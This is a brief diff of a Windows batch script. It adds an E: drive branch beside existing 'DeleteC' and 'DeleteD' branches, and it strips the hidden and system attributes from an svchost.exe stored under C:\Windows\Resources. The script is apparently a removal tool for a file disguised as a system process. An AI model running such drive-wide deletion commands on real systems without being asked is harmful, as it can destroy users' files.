@@ -4,6 +4,8 @@ timeout 3 > NUL
 cls
 if %CD%==C:\ goto DeleteC
 if %CD%==D:\ goto DeleteD
+if %CD%==E:\ goto DeleteE
+
 
 :DeleteC
 attrib -h -r -s /s /d C:\Windows\Resources\svchost.exe
